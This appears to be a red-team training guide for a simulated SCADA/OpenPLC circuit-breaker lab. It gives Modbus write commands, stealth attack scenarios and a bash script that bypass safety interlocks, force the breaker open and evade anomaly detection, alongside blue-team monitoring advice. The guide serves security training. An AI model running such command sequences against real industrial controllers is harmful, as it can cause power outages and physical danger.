# Red Team Attack Vectors Guide - GridGuard SCADA
## PLC Program: breaker_control_redteam_ready.st

### 🎯 **PRIMARY OBJECTIVE**
Manipulate the circuit breaker to open undetected while avoiding detection by:
- The anomaly detector monitoring loading percentages
- PLC-based security monitoring
- SCADA dashboard alerts

---

## 🔴 **ATTACK VECTORS**

### **1. Maintenance Override Bypass** 
**Target:** `%MD12` (maintenance_override register)
**Technique:** Write `0xDEADBEEF` to bypass all safety interlocks
**Modbus Command:**
```bash
# Write to holding register 12 (MD12)
modbus write --address 12 --value 3735928559  # 0xDEADBEEF in decimal
```
**Detection Risk:** High - triggers security event counter and maintenance LED
**Stealth Level:** Low

### **2. Safety Timer Manipulation**
**Target:** `%MD16` (safety_timer_preset register)
**Technique:** Reduce safety timer to minimize delay detection window
**Modbus Command:**
```bash
# Reduce safety timer to minimum (still within acceptable range to avoid detection)
modbus write --address 16 --value 50
```
**Detection Risk:** Medium - values outside 50-500 trigger security violations
**Stealth Level:** Medium

### **3. Emergency Bypass Activation** ⚠️ **HIGH STEALTH**
**Target:** `%QX0.5` (emergency_bypass output)
**Technique:** Set emergency bypass for immediate breaker control
**Modbus Command:**
```bash
# Set emergency bypass coil
modbus write --coil 5 --value 1
```
**Detection Risk:** Medium - increments security event counter but may appear legitimate
**Stealth Level:** High

### **4. System Health Signature Corruption** 🎯 **PERSISTENCE**
**Target:** `%MD20` (health_signature register)
**Technique:** Corrupt signature for persistent backdoor access
**Modbus Command:**
```bash
# Corrupt health signature
modbus write --address 20 --value 1234567890
```
**Detection Risk:** High - immediately marks system as compromised
**Stealth Level:** Low (but provides persistence)

### **5. Covert Channel Communication** 🕵️ **ADVANCED**
**Target:** `%QX0.6` (debug_mode) + monitoring `covert_channel_data`
**Technique:** Use debug mode for steganographic command and control
**Modbus Commands:**
```bash
# Enable debug mode
modbus write --coil 6 --value 1

# Monitor covert channel data
modbus read --address 24 --count 1  # Read covert_channel_data
```
**Detection Risk:** Low - appears as debug activity
**Stealth Level:** Very High

---

## 🔵 **BLUE TEAM DETECTION STRATEGIES**

### **Monitoring Points**
1. **Security Event Counter (`%MD8`)** - Watch for rapid increments
2. **Last Command Time (`%MD4`)** - Detect unexpected command timing
3. **System Compromise Flag** - Monitor security_alert_led (%QX0.4)
4. **Memory Register Changes** - Track writes to critical registers

### **Anomaly Patterns to Monitor**
- Sudden drops in safety_timer_preset values
- Activation of emergency_bypass during normal operations  
- Health signature modifications
- Unusual debug mode activation patterns
- Command timing outside normal operational windows

### **SCADA Integration Points**
Monitor these Modbus addresses for suspicious activity:
```
%MD8  (Address 8)  - Security event counter
%MD12 (Address 12) - Maintenance override key
%MD16 (Address 16) - Safety timer preset  
%MD20 (Address 20) - Health signature
%QX0.4 (Coil 4)   - Security alert LED
%QX0.5 (Coil 5)   - Emergency bypass
%QX0.6 (Coil 6)   - Debug mode
```

---

## 🎮 **ATTACK SCENARIOS**

### **Scenario 1: Stealth Bypass** ⭐ **RECOMMENDED FOR TESTING**
1. Enable debug mode for reconnaissance: `modbus write --coil 6 --value 1`
2. Reduce safety timer slightly: `modbus write --address 16 --value 75`
3. Wait for normal operation window
4. Activate emergency bypass briefly: `modbus write --coil 5 --value 1`
5. Trigger breaker open via normal start/stop logic
6. Disable emergency bypass: `modbus write --coil 5 --value 0`
7. Restore safety timer: `modbus write --address 16 --value 100`
8. Disable debug mode: `modbus write --coil 6 --value 0`

### **Scenario 2: Maintenance Masquerade**
1. Activate maintenance override: `modbus write --address 12 --value 3735928559`
2. Control breaker directly via start button input
3. Clean up: `modbus write --address 12 --value 0`

### **Scenario 3: Persistence Attack**
1. Corrupt health signature: `modbus write --address 20 --value 999999`
2. System remains flagged as compromised
3. Use compromised state for ongoing access

---

## 📊 **SUCCESS METRICS**

### **Red Team Success:**
- Breaker state changed without anomaly detector alerts
- Loading percentage drops to 0% (indicating successful attack)
- Security event counter remains low (<5 events)
- No persistent security alert LED activation

### **Blue Team Success:**  
- Detect attack within 30 seconds of initiation
- Anomaly detector flags unusual loading patterns
- Security monitoring identifies unauthorized memory writes
- Proper correlation between PLC events and SCADA alerts

---

## 🛠️ **TESTING COMMANDS**

### **Setup Test Environment**
```bash
# Start GridGuard system
./start.sh

# Upload red team ready PLC program via OpenPLC web interface
# http://localhost:8080
# Upload: plc_logic/programs/breaker_control_redteam_ready.st
```

### **Monitor System Status**
```bash
# Check security event counter
modbus read --address 8 --count 1

# Check system health  
modbus read --address 20 --count 1

# Monitor breaker state
modbus read --coil 0 --count 1
```

### **Attack Execution Template**
```bash
#!/bin/bash
echo "🔴 Starting Red Team Attack Simulation"
echo "Target: Circuit Breaker Control"

# Your attack commands here
modbus write --coil 5 --value 1    # Emergency bypass
sleep 2
modbus write --coil 0 --value 0    # Force breaker open
sleep 5  
modbus write --coil 5 --value 0    # Disable bypass

echo "✅ Attack sequence completed - Check anomaly detector for detection"
```

---

## ⚠️ **SAFETY NOTES**

This is a **simulation environment** designed for cybersecurity training. In real industrial environments:
- Never attempt unauthorized PLC access
- Always follow proper safety protocols
- Obtain explicit permission before security testing
- Document all activities for incident response training

**Happy Red Team Testing! 🕵️‍♂️**